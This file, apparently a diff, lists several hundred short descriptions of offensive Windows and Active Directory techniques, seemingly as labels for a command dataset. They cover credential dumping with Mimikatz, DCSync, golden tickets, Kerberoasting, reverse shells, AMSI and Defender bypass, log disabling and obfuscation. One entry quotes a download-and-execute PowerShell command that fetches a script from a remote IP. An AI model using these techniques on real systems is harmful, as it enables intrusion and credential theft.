+Add a firewall rule to open a specified TCP port for incoming traffic.
+Download and execute a PowerShell script from a specific server with a hidden process.
+Configure IIS logging settings
+Retrieve browser history information
+Retrieve Windows updates information
+Dump Chrome passwords
+Execute a command from a remote malicious website
+Invoke Mimikatz to dump credentials
+Download content from a hidden URL
+Retrieve Group Policy Objects
+Execute a PowerShell script stored on the local system
+Create a minidump of a specific process
+Invoke Mimikatz using PowerShell
+Download and execute a file from a remote server
+Invoke a command from a remote malicious website
+Execute a Netcat command
+Create minidump files for all running processes
+Download and execute a script from a remote website using PowerShell
+Modify Windows Registry to execute a custom binary at startup
+Set up port forwarding using netsh
+Execute a payload with a DLL injection
+Perform credential injection and create a new Windows logon session
+Execute a specific Atomic Red Team technique
+Execute PowerShell command from Notepad process
+Write content to a file
+Start UltraVNC Viewer process
+Perform RID Hijacking
+Silently install NetSupport Manager
+Invoke Mimikatz to dump credentials
+Invoke a method on a WMI class (Win32_Product) with specified arguments
+Execute a command from a remote malicious website
+Invoke a command on a remote system using PowerShell
+Retrieve credentials from the Windows Credential Manager
+Perform ASREPRoast attack
+Mount a disk image
+Invoke a command on a remote system using PowerShell
+Retrieve the version of Internet Explorer from the registry
+Retrieve properties of a registry key
+Download a file from a remote URL using PowerShell
+Execute a local PowerShell script
+Invoke a command on a remote system using PowerShell
+Inject a DLL into a specific process
+Retrieve information about running processes
+Retrieve LAPS passwords from a domain controller
+Invoke a command using PowerShell
+Invoke Mimikatz to dump credentials using PowerShell
+Execute a command from a remote malicious website using PowerShell
+Execute a command from a remote malicious website using PowerShell
+Perform reflective PE injection
+Execute MSBuild on a remote system
+Retrieve network connection information
+Configure IIS logging settings
+Invoke a method on a WMI class (Win32_Product) with specified arguments
+Import a custom module and invoke Mimikatz to dump credentials
+Write PowerShell version information to the console
+Retrieve and filter process information using PowerShell
+Invoke a command on a remote system using PowerShell
+Invoke a command on a remote system using PowerShell
+Start a new PowerShell process with specific arguments
+Invoke Mimikatz to dump credentials and execute a Meterpreter payload
+Source a script and retrieve Group Policy Preferences (GPP) passwords
+Retrieve and format information about the computer system using WMI
+Encode a Mimikatz command as a Unicode payload
+Create an elevated persistence option in the Windows Registry
+Various commands to retrieve user, group, and directory information
+Execute a command from a remote malicious website using PowerShell
+Retrieve information about security packages on the system
+List web credentials using the VaultCmd tool
+Execute a command from a remote malicious website using PowerShell
+Disable various Windows Defender features
+Start a process on a remote computer
+Execute a PowerShell script with specific execution policy, window style, and profile settings.
+Download and execute a script on a remote computer using Invoke-Command and Invoke-Expression.
+Retrieve information about processes, copy to clipboard, and execute from clipboard.
+Download and execute a script with encoded PowerShell command from a specified URL.
+Download and execute a script using Invoke-Expression and WebClient.
+Create a minidump for the svchost process.
+Import a PowerShell module and use timestomp to modify timestamps for a file.
+Invoke token manipulation to impersonate the 'nt authority\system' user.
+Execute Mimikatz to dump credentials with specific PowerShell settings.
+Decode and execute a PowerShell command from a base64-encoded string.
+Search for domain information in the 'testlab.local' domain using Get-DomainSearcher.
+Execute SSH command to retrieve user identity information.
+Download and execute a malicious PowerShell script from a remote URL.
+Invoke Mimikatz tool to dump credentials from the current system.
+Perform an Active Directory search for user objects.
+Download and execute a PowerShell script from a remote URL.
+Run a PowerShell script block on a remote computer to download and execute a script.
+Download and execute a PowerShell script from a remote URL.
+Run PowerShell with specific options to execute Mimikatz and dump credentials.
+Download and execute a PowerShell script from a hidden URL.
+Download and execute a PowerShell script from a remote URL.
+Download and execute a PowerShell script from a remote URL.
+Search for sensitive files in user directories and display the first 5 results.
+Download and execute a PowerShell script from a remote URL.
+Execute a tool or script (xordump.exe) with specified parameters.
+Load a new in-memory PowerShell module named Win32.
+Run a command using cmd to control Windows Defender settings.
+Run a PowerShell script block on a remote computer to download and execute a script.
+Create a new item (file) and then remove it, ignoring errors if any.
+Execute a PowerShell script from a local file.
+Change directory to temp, then run Kerbrute to brute force user accounts against a domain controller.
+Download and execute a file using PowerShell WebClient.
+Invoke a command to start PowerShell via cmd, launch a Tor executable, sleep for 60 seconds, and stop the Tor process.
+Download and execute an executable file from a remote URL, hiding the PowerShell window.
+Execute a PowerShell cmdlet related to Windows audio devices.
+Retrieve and format information about recorded TV items.
+Perform an LDAP search in the specified domain for user accounts with a specific account type and retrieve selected properties.
+Execute a PowerShell script located at C:\WinHack.ps1 with Bypass execution policy.
+Execute a PowerShell script from a file with Bypass execution policy.
+Define a script containing Mimikatz command and execute it using PowerShell with Bypass execution policy.
+Define a command to execute the Calculator and execute it using PowerShell Invoke-Expression.
+Run a command using cmd to print a file with WordPad multiple times.
+List all Windows Credentials using vaultcmd utility.
+Invoke NetRipper to capture network traffic and log it to C:\Temp\ when Chrome is running and contains the search term 'SecretTerm'.
+Download and execute a PowerShell script from a remote URL with Bypass execution policy.
+Invoke shellcode in the context of a specified process (ProcessId 44009).
+Execute rundll32.exe with specified parameters.
+Download and execute a PowerShell script from a remote URL with Bypass execution policy.
+Run a PowerShell script block on a remote computer to download and execute a script.
+Download and execute a PowerShell script from a remote URL with Bypass execution policy.
+Download a PowerShell script from a remote URL and execute it.
+Execute a PowerShell script from a local file with Bypass execution policy.
+Enumerates the machines where a specific domain user/group is a member of a specific local group.
+Scanning for Open Ports, Scans the first 1024 ports on the local machine to check for open ports, which can be used to identify potential vulnerabilities.
+PowerShell command is to create a new PowerShell session (New-PSSession) named "PSC" on the remote computer with the specified name "the.computer.name," and then enter that session (Enter-PSSession). This allows the user to interact with the remote computer using PowerShell commands within the created session. It's important to note that you need the necessary permissions and authentication to establish a remote PowerShell session on the specified computer.
+This is for an attack from child to root domain, Get child domain SID (this is the SID of the domain that has the trust relationship with the root domain)
+Check if any of the interesting permissions founds is realated to a username/group
+Telnet Server Until Windows10, all Windows came with a Telnet server that you could install (as administrator) doing:
+Through Certify, enumerate trusted root CA certificates, certificates defined by the NTAuthCertificates object, and various information about Enterprise CAs
+Bypassing Execution Policy for Script Execution, Temporarily bypasses the script execution policy to run a PowerShell script, allowing execution of unsigned scripts.
+Retrieving Stored Credentials, Prompts for user credentials and then displays the username and password, useful for credential harvesting.
+If you see the results of @@selectname, it worked
+Port scan a host for interesting ports, Here's how to quickly port scan a specified IP address (10.10.15.232) for selected 39 interesting ports:
+Logging in Using a regular method with the credentials of the users who is has access to the external domain you should be able to access:
+Add-ObjectAcl cmdlet to grant the DCSync rights to a specified user ("username") on the Active Directory object with the distinguished name "dc=dollarcorp,dc=moneycorp,dc=local". This command is essentially configuring permissions to allow the specified user to perform DCSync operations on the specified Active Directory object.
+Checks the rights on each computer with LAPS enabled for any groups with read access and users with "All Extended Rights"
+If you are sysadmin in some trusted link you can enable xp_cmdshell with:
+If you have some valid credentials and you have discovered valid MSSQL hosts you can try to login into them. The discovered MSSQL servers must be on the file: C:\temp\instances.txt
+Allow Remote Desktop connections, Allow RDP connections
+Simple PowerShell Reverse Shell, Establishes a basic reverse shell connection to a specified attacker-controlled machine. This allows the attacker to execute commands remotely.
+Admin users that allow delegation, logged into servers that allow unconstrained delegation
+Get name of the principal in the current domain member of the cross-domain group
+Groups info
+Use Rubeus with the certificate to authenticate as the other user
+perform a Kerberoasting attack, specifically targeting the service account "websvc" to retrieve Kerberos tickets that can be cracked offline to obtain plaintext credentials. The command is configured to target a specific user ("websvc") using the "-Identity" parameter. Without the "-Identity" parameter, the cmdlet would kerberoast tickets for all possible users.
+Extracting SSH Keys from User Directories, Searches for RSA private keys in the .ssh directories of all users, which can be used for unauthorized access to SSH servers.
+Search "RDPUsers" users
+Get stored Wi-Fi passwords from Wireless Profiles, With this command we can extract all stored Wi-Fi passwords (WEP, WPA PSK, WPA2 PSK etc.) from the wireless profiles that are configured in the Windows system:
+psexec into the root domain controller using the golden ticket
+An MSI installer package can be easily generated using msfvenom utility from Metasploit Framework. For instance, we can add ourselves into the administrators group:
+Change expiration time of the password
+Enumerating from the network without domain session, Get local MSSQL instance (if any)
+You can use Set-DCShadowPermissions to give these privileges to an unprivileged user (notice that this will leave some logs). This is much more restrictive than having DA privileges.
+Enumerate all the trusts of all the domains found
+Explanation A certificate authority itself has a set of permissions that secure various CA actions. These permissions can be access from `certsrv.msc`, right clicking a CA, selecting properties, and switching to the Security tab:   This can also be enumerated via PSPKI�s module with `Get-CertificationAuthority | Get-CertificationAuthorityAcl`:
+Find potentially interesting files, With this command we can identify files with potentially sensitive data such as account information, credentials, configuration files etc. based on their filename:
+Dumping Credentials from Windows Services, Lists Windows services that are running under a specific user account, which can sometimes include credentials in the service configuration.
+MISC Inject Skeleton Key into LSASS process on Domain Controller.
+Enumerating vulnerable users (need domain credentials)
+use icacls.exe to grant read and execute (RX) permissions to the "Everyone" group for the specified directory path "C:\Users\redsuit\Documents\ssh\OpenSSH-Win64" and its subdirectories (/T).
+Out-Of-Band Data Exfiltration, Exfiltrates data out of the target network using web requests, which can bypass traditional data loss prevention mechanisms.
+System Information with WMI.
+Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
+Starting the Mozilla Maintenance Service Next, we can replace this file with a malicious `maintenanceservice.exe`, start the maintenance service, and get command execution as SYSTEM.
+Register a new PS Session configuration
+Using PowerShell Classes for Code Hiding, Defines a custom PowerShell class to encapsulate and hide malicious code, making it harder for security tools to detect.
+Credentials in SYSVOL and Group Policy Preferences (GPP)
+Find unquoted service paths, This can lead to privilege escalation in case the executable path also contains spaces and we have write permissions to any of the folders in the path., The following PowerShell command will print out services whose executable path is not enclosed within quotes ('):
+Get groups with privileges in other domains inside the forest
+LDAP With this privilege you can dump the DC database using DCSync:  execute the "lsadump::dcsync" command, targeting the Domain Controller "pcdc.domain.local" for the "domain.local" domain and requesting the retrieval of sensitive information, specifically for the "krbtgt" user. This command is commonly used in attacks to extract and dump Kerberos Ticket Granting Ticket (TGT) hashes from Active Directory.
+using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
+Listing Running Processes with Details, Lists all currently running processes on the system, sorted by CPU usage, and includes process names, IDs, and CPU time.
+WTS Impersonator Enumerate Local Users on the machine the tool is running from.
+Extracting Credentials from IIS Application Pools, Retrieves configuration details of IIS Application Pools, including service accounts, which might contain credentials.
+Modifying Token Privileges, Enabling Privileges: Using Enable-NtTokenPrivilege and Disable-NtTokenPrivilege, privileges can be toggled.
+Find intresting ACEs (Interesting permisions of "unexpected objects" (RID>1000 and modify permissions) over other objects
+Enrollment agent certificate to issue a certificate request on behalf of another user to a template that allow for domain authentication
+Process Information with WMI.
+Set MAC address from command-line, Sometimes it can be useful to set MAC address on a network interface and with PowerShell we can easily do it without using any 3rd party utility:
+List namespaces inside "root\cimv2" with WMI
+Using PowerShell to Interact with the Network Quietly, Establishes a network connection for quiet data transmission, useful for maintaining stealth during data exfiltration or command and control operations.
+find and filter information related to processes, threads, files, keys, and process IDs (PIDs) from the output of handle64.exe. The /r option in findstr indicates that the search string is a regular expression, and /i makes the search case-insensitive
+Access DB Search keywords in columns trying to access the MSSQL DBs
+Accessing Event Logs for Anomalies, Searches the Security event log for entries where the entry type is `FailureAudit', which can indicate securityrelated anomalies.
+Enumerates the members of specified local group (default administrators) for all the targeted machines on the current (or specified) domain.
+This command can provide information about the current security policies related to user accounts on the Windows system.
+PowerShell's ls (or Get-ChildItem) cmdlet to list the contents of the C$ share on a remote host named "victim.domain.local." This command is attempting to enumerate the files and directories on the C: drive of the specified remote host through the administrative share (C$). It's essential to ensure that you have proper authorization and that such actions comply with security policies when accessing remote systems.
+"WTSImpersonator.exe" to perform a user-hunting operation, targeting a specific user in a given domain, using a list of IP addresses. Additionally, it executes two other executables, "ExeToExecute.exe" and "WTServiceBinary.exe," as part of the operation. 
+Find credentials in Sysprep or Unattend files, This command will look for remnants from automated installation and auto-configuration, which could potentially contain plaintext passwords or base64 encoded passwords:
+Find users with sidHistory set
+Enumerating from the network without domain session, If you don't have a AD account, you can try to find MSSQL scanning via UDP
+HTTP-Based PowerShell Reverse Shell, This script creates a more resilient reverse shell that attempts to reconnect every 10 seconds if the connection is lost. It uses HTTP for communication.
+Leverage Mimikatz to perform a DCSync attack, specifically targeting the KRBTGT account in the "dcorp" domain to extract sensitive credential information from Active Directory.
+Enumerating from inside the domain.This looks for SPNs that starts with MSSQL.Test connections with each one
+Get permissions of a file
+Dynamic Invocation with Reflection, Uses reflection to dynamically invoke system management functions, allowing for more stealthy execution of commands.
+Set the owner of 'dfm' in the current domain to 'harmj0y'
+With the following command(s) we can disable the PowerShell command logging functionality in the current shell session, no command will be recorded in the PowerShell history file:
+Full way impersonating the user, Get a TGT of the user with cross-domain permissions
+Command Aliasing, Creates an alias for a PowerShell command to disguise its true purpose, which can be useful in evading script analysis.
+Get stored passwords from Windows PasswordVault, Using the following PowerShell command we can extract secrets from the Windows PasswordVault, which is a Windows built-in mechanism for storing passwords and web credentials e.g. for Internet Explorer, Edge and other applications:
+Using Get-NtTokenPrivilege, This command lists the privileges of a token, showing their names, LUIDs, and whether they are enabled or disabled. This is useful for assessing the capabilities of a user or process.
+Find computers with Constrained Delegation
+Get Kerberoastable users
+Groups that contain users outside of its domain and return its members
+Get users with reversible encryption (PWD in clear text with dcsync)
+File-less download and execute, Using this tiny PowerShell command we can easily download and execute arbitrary PowerShell code that is hosted remotely ' either on our own machine or on the Internet - The remote content will be downloaded and loaded without touching the disk (file-less):
+Extract all local Master Keys with Administrator If you are administrator you can obtain the dpapi master keys using sekurlsa. This module allows Mimikatz to perform various actions related to DPAPI, such as extracting DPAPI master keys, decrypting DPAPI-protected data, and interacting with DPAPI-related functionality in the Windows operating system
+Enumerating Domain Users, Retrieves a list of all domain users, including their names, account status, and last logon dates.
+Dump passwords from Google Chrome browser, The following command extracts stored credentials from the Google Chrome browser, if is installed and if there are any passwords stored:
+Get users with privileges in other domains inside the forest
+Executing Remote Commands, Executes a command remotely on a target PC, in this case, listing processes. Requires credentials for the target system.
+Environment Variable Obfuscation, Stores a command in an environment variable and then executes it, which can help hide the command from casual observation and some security tools.
+Direct bypass: uninstall a .NET assembly (psby.exe) using the InstallUtil.exe tool with logging to console enabled.
+Reading Credentials from Configuration Files, Searches for strings containing `password=' in all .config files on the C: drive, which can reveal hardcoded credentials.
+Find interesting files, can use filters
+Get members of the cros-domain group
+Transform SID to name
+COnvert GPO GUID to name
+Search registry for auto-logon credentials, Windows systems can be configured to auto login upon boot, which is for example used on POS (point of sale) systems. Typically, this is configured by storing the username and password in a specific Winlogon registry location, in clear text.The following command will get the auto-login credentials from the registry:
+Check current logon session as administrator using logonsessions from sysinternals
+ Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use /patch for a subset of data, use /inject for everything. Inject LSASS to extract credentials.
+Disable PowerShell command logging, The PowerShell history file is a plaintext file located in each users' profile in the following location:
+Get last user logged on (needs admin rigths in host)
+Add user to 'Domain Admins'
+Get specific info of current domain controller
+Rubeus.exe to generate and display the Kerberos Ticket Granting Ticket (TGT) hash for a specified computer account ("FAKECOMPUTER$") with the password "123456" in the "domain.local" domain. This operation is commonly performed in Kerberos ticket forging or password spraying attacks for lateral movement or privilege escalation.
+Extracting System Secrets with Mimikatz, Uses Mimikatz to extract logon passwords and other sensitive data from system memory.
+Generate a Golden Ticket for Kerberos authentication. The intent of this command is to create a malicious Kerberos ticket for the user "LukeSkywalker" with specific parameters, including the user ID, domain, security identifier (SID), target server, RC4 encryption key, and service type (in this case, "cifs" or Common Internet File System). After executing the Mimikatz command, the "exit" statement is used, potentially to exit the Mimikatz tool.
+Check if AlwaysInstallElevated is enabled, If the following AlwaysInstallElevated registry keys are set to 1, it means that any low privileged user can install *.msi files with NT AUTHORITY\SYSTEM privileges. Here's how to check it with PowerShell:
+Obtain a shell
+Check for LSASS WDigest caching, if it is disabled, we can still enable it using the following command, but we will also have to restart the system afterwards:
+Try to connect and obtain info from each MSSQL server (also useful to check conectivity)
+Base64 Encoding for Command Obfuscation, Encodes a PowerShell command in Base64 to obfuscate it, making it less detectable by security tools.
+Get special rights over All administrators in domain
+Execute code in the victim system using WMI
+Taking Ownership of the File After running the PowerShell script, we should have full control of this file and can take ownership of it.
+Enumerate permissions for GPOs where users with RIDs of > 1000 have some kind of modification/control rights
+Variable Name Obfuscation, Obfuscates a command by splitting it into parts and reassembling it, making the command less recognizable to security tools.
+Returns all GPOs that modify local group memberships through Restricted Groups or Group Policy Preferences.
+Lets list groups members of the domain and its members
+Registry Key Usage for Persistence, Uses the Windows Registry to store and later execute encoded payloads, aiding in persistence and evasion.
+Through Certify, enumerate Enterprise CAs
+If you are already inside the Windows machine you can force Windows to connect to a server using privileged accounts with Defender MpCmdRun
+Get AdminSDHolders
+Through Certify, enumerate vulnerable certificate templater
+Execution Policy Bypass
+Users Filters, All enabled users
+using DAMP, abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
+Get-DomainObject cmdlet to retrieve information about the machine account quota for the domain specified as "domain.local." The command fetches the machine account quota attribute for the domain "dc=domain,dc=local" and then selects and displays the "MachineAccountQuota" property. This information is related to the limit on the number of computer objects (machine accounts) that can be created in the specified domain.
+Convert SID to Name
+use GetUserSPNs.py to request Service Principal Names (SPNs) without preauthentication for a list of users specified in the "LIST_USERS" file, targeting the domain controller "dc.domain.local" in the "domain.local" domain, and utilizing the "NO_PREAUTH_USER" as a user with no preauthentication.
+Execution of a payload using a tool called "jp.exe" with the intent of running PowerShell code from a remote source. .\jp.exe: Executes the "jp.exe" program or script. -l 1337: Specifies the listening port (1337 in this case). -c "{4991d34b-80a1-4291-83b6-3328366b9097}": Specifies a unique identifier or command channel. It could be used for communication or identification purposes. -p c:\windows\system32\cmd.exe: Specifies the program to execute, which is the Windows Command Prompt ("cmd.exe"). -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')": Specifies the arguments to be passed to the executed program. In this case, it runs a PowerShell command that downloads and executes a PowerShell script from a remote location ("http://10.10.14.3:8080/ipst.ps1"). -t : Specifies the target. In this case, the asterisk () may indicate that the payload is intended to target all available systems.
+Persistence Force preauth not required for a user where you have GenericAll permissions (or permissions to write properties):
+Utilizing PowerShell Runspaces for Evasion, Executes PowerShell commands within a separate runspace, isolating them from the main PowerShell environment and evading some forms of detection.
+Extracting Network Configuration, This command gathers network configuration details such as interface aliases, IPv4 and IPv6 addresses, and DNS server information.
+Key Privileges, Allows bypassing traverse checking. 
+Set-DomainObject cmdlet to modify the service principal name (SPN) attribute for a specified user (<username>) in a Windows domain. The command is attempting to set the SPN to "fake/NOTHING". SPNs are used in Kerberos authentication and are associated with services running on servers. Modifying SPNs can have implications for authentication and authorization in a Windows domain, so it's important to ensure that such changes are made with proper authorization and understanding of the potential impact.
+List RDP sessions inside a host (needs admin rights in host)
+Here's a quick one-liner for checking whether we are running elevated PowerShell session with Administrator privileges:
+List all usernames
+Using the Get-WinEvent cmdlet to query the Security log for events with Event ID 4769. The command filters the events based on various conditions in the event message. Specifically, it filters out events where the service account is 'krbtgt,' the account name ends with '$', the account name does not contain '$@', the failure status is '0x0,' and the substatus is '0x17'.
+perform Kerberoasting against the specified domain controller ("dc.domain.local") for the "domain.local" domain. It uses a user with no preauthentication ("NO_PREAUTH_USER") and targets a specific service principal name ("TARGET_SERVICE"), with the results saved to an output file named "kerberoastables.txt".
+SID History Abuse You could also abuse SID History across a forest trust.  If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust.  As a reminder, you can get the signing key with
+Encoded Command Execution, Executes a Base64-encoded PowerShell command, which can help bypass simple command-line logging and analysis tools.
+"WTSImpersonator.exe,"   launching an external executable with \(-c flag\), and specifying the command to be executed, which is opening the Command Prompt "C:\\Windows\\System32\\cmd.exe".
+Abuse Organizations can check if the setting is enabled using the following `certutil.exe` command.
+Download the certificate with Certify
+Get name of DC of the other domain
+Active User Credential Theft via Certificates. If the user is allowed to request a certificate that allows domain authentication, an attacker could request and steal it to maintain persistence.  The `User` template allows that and comes by default. However, it might be disabled. So, Certify allows you to find valid certificates to persist:
+Get users inside "Administrators" group. If there are groups inside of this grup, the -Recurse option will print the users inside the others groups also
+Credentials user impersonation If you have valid credentials of any other user, you can create a new logon session with those credentials :
+Get all descriptions
+Find any machine accounts in privileged groups
+Access DB Dump an instance (a lotof CVSs generated in current dir)
+ASREPRoastable and Kerberoastable users
+Find interesting ACLs
+Display information about the SNMP service configuration in the Windows Registry. This might include details such as service parameters, settings, and configurations related to SNMP.
+Get groups that can read passwords with LAPS enabled
+Privilege Checks, This command checks if a specific privilege is enabled. It's essential for verifying the operational status of a privilege before attempting actions that require it.
+Using PowerShell to Access WMI for Stealth, Leverages WMI (Windows Management Instrumentation) to execute system queries, which can be less conspicuous than direct PowerShell commands.
+Mimikatz is intended to exploit the trust relationship in the Local Security Authority (LSA) and perform a dump of trust-related information. Specifically, the commands "privilege::debug" are used to enable debug privileges, followed by "lsadump::trust /patch" to exploit the trust relationships and potentially extract sensitive information.
+Scheduled Task for Persistence, Creates a scheduled task to execute PowerShell commands, ensuring persistence and execution even after system reboots.
+Listen address ACLs, It will show a list of URL reservations on the system, including details such as the URL, the security identifier (SID) of the user or group associated with the reservation, and the permissions granted.
+Certutil It's possible to use certutil.exe lolbin (Microsoft-signed binary) to coerce NTLM authentication:
+Force authentication from victim to compromised machine with port forwards
+Get usernames and their groups
+Get info about the external forest (if possible)
+Get computers with LAPS enabled, expirations time and the password (if you have access)
+Encrypted PowerShell Reverse Shell, Creates an encrypted reverse shell using SSL to secure the communication channel, making it more difficult for network security measures to inspect the traffic.
+Attack SID History was designed to support migration scenarios, where a user would be moved from one domain to another. To preserve access to resources in the "old" domain, the user's previous SID would be added to the SID History of their new account. So when creating such a ticket, the SID of a privileged group (EAs, DAs, etc) in the parent domain can be added that will grant access to all resources in the parent.  This can be achieved using either a Golden or Diamond Ticket. Find the SID of a group of the other domain (for example "Domain Admins") is with:
+Extract all backup Master Keys with Domain Admin A domain admin may obtain the backup dpapi master keys that can be used to decrypt the encrypted keys:
+List installed antivirus (AV) products, Here's a simple PowerShell command to query Security Center and identify all installed Antivirus products on this computer:
+Check for LSASS WDigest caching, Using the following command we can check whether the WDigest credential caching is enabled on the system or not. This settings dictates whether we will be able to use Mimikatz to extract plaintext credentials from the LSASS process memory.
+Downloading and Executing Scripts from URL, Downloads and executes a PowerShell script from a specified URL. Useful for executing remote payloads.
+Get root domain SID (this is the SID of the domain that has the trust relationship with the child domain)
+Creating Reverse Shell, Establishes a reverse shell connection to a specified attacker-controlled machine, allowing remote command execution.
+Since the SYSVOL network shares are accessible to any authenticated domain user, we can easily identify if there are any stored credentials using the following command:
+Users that require a smart card to logon
+Accessing Physical Memory with Windows API, This PowerShell script uses the ReadProcessMemory function from the Windows API to read a specified amount of memory from a process. It's useful for extracting information from running processes.
+Finding Windows Servers on the domain Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
+Get usernames and their groups where name is like "admin"
+Get Forest info
+Locate web server configuration files, With this command, we can easily find configuration files belonging to Microsoft IIS, XAMPP, Apache, PHP or MySQL installation:
+It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
+Manual trusted link queery
+Enumerate machines where a particular user/group identity has local admin rights
+Modifying Token Privileges, Removing Privileges completely removes a privilege from a token, preventing its re-enabling.
+SpoolSample.exe with the specified <TARGET> and <RESPONDERIP> as parameters, suggesting an attempt to exploit a print spooler vulnerability for lateral movement or privilege escalation in a Windows environment.
+Full way impersonating the user, Get a TGT from the current domain for the target domain for the user
+Extracting Saved RDP Credentials, Lists and deletes saved Remote Desktop Protocol (RDP) credentials, which can be used to access remote systems.
+Search unconstrained delegation computers and show users
+Get all domain trusts (parent, children and external)
+Bypassing AMSI (Anti-Malware Scan Interface), Bypasses the Anti-Malware Scan Interface (AMSI) in PowerShell, allowing the execution of potentially malicious scripts without detection.
+ackdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
+Users Filters, All disabled users
+Get active sessions on the host
+Find database credentials in configuration files, Using the following PowerShell command we can find database connection strings (with plaintext credentials) stored in various configuration files such as web.config for ASP.NET configuration, in Visual Studio project files etc.:
+Search account with "something" in a parameter
+DNS-Based PowerShell Reverse Shell, This script uses DNS requests to exfiltrate data, making the reverse shell traffic appear as DNS queries, which can be less suspicious and harder to detect.
+Port scan a network for a single port (port-sweep) with PowerShell TcpClient, This could be useful for example for quickly discovering SSH interfaces (port tcp/22) on a specified network Class C subnet (10.10.0.0/24):
+After we are done with our business, remove the rule in the Windows firewall:
+Retrieving Passwords from Unsecured Files, Searches for the term `password' in all text files within the Documents folders of all users, which can reveal passwords stored insecurely.
+Here's a useful command to whitelist an IP address in the Windows firewall, after this we should be able to connect to this host from our IP address (10.10.15.123) on every port:
+Get all ifo of specific domain Domain Controller
+Check for possible vulnerabilities on an instance where you have access
+Bypassing common detections The most frequent ways to detect a golden ticket are by inspecting Kerberos traffic on the wire.  By default, Mimikatz signs the TGT for 10 years, which will stand out as anomalous in subsequent TGS requests made with it.  Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).
+Meterpreter Get rev shell (x64), generate a payload with the intent of establishing a reverse TCP shell on a target system.
+Bypassing Script Execution Policy, Temporarily changes the script execution policy to allow the running of unauthorized scripts, then reverts it back to its original setting.
+Windows API for Clipboard Access, This script demonstrates how to access and manipulate the Windows clipboard using API calls. It can be used to read or modify clipboard contents for information gathering or data manipulation.
+Reverse shell: uninstall a .NET assembly (psby.exe) using InstallUtil.exe while simultaneously attempting to establish a reverse shell connection to the IP address 10.10.13.206 on port 443, with logging to the console enabled.
+Search for SNMP community string in registry, Finding a SNMP community string is not a critical issue, but it could be useful to Understand what kind of password patterns are used among sysadmins in the organization, The following command will extract SNMP community string stored in the registry, if there is any:
+Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)
+Manipulating Windows Services via API, This script uses Windows API calls to interact with Windows services, such as creating, starting, or modifying them. This can be used for persistence or privilege escalation.
+Get info about a user
+ Mimikatz tool to perform a Kerberos Golden Ticket attack.Generate a forged Kerberos ticket for the Administrator user in the specified domain ("rd.lab.adsecurity.org"). It specifies various parameters such as the user ID, security identifier (SID), key, group information, and ticket lifetime. After executing the Mimikatz command, it exits, potentially to avoid leaving traces or to conclude the operation.
+Conducting Network Sniffing, Sets up a network capture session to sniff packets, which can be analyzed for sensitive data or network troubleshooting.
+Get locally logon users at the moment (need remote registry (default in server OS))
+Retrieving Credentials from Database Connection Strings, Scans for database connection strings in web application configuration files, which often contain credentials for database access.
+Basic user enabled info
+To stop a guest SMB shared drive, (This could come handy for transferring files, exfiltration etc.) execute:
+Get members from Domain Admins (default) and a list of computers and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host. If -Checkaccess, then it also check for LocalAdmin access in the hosts.
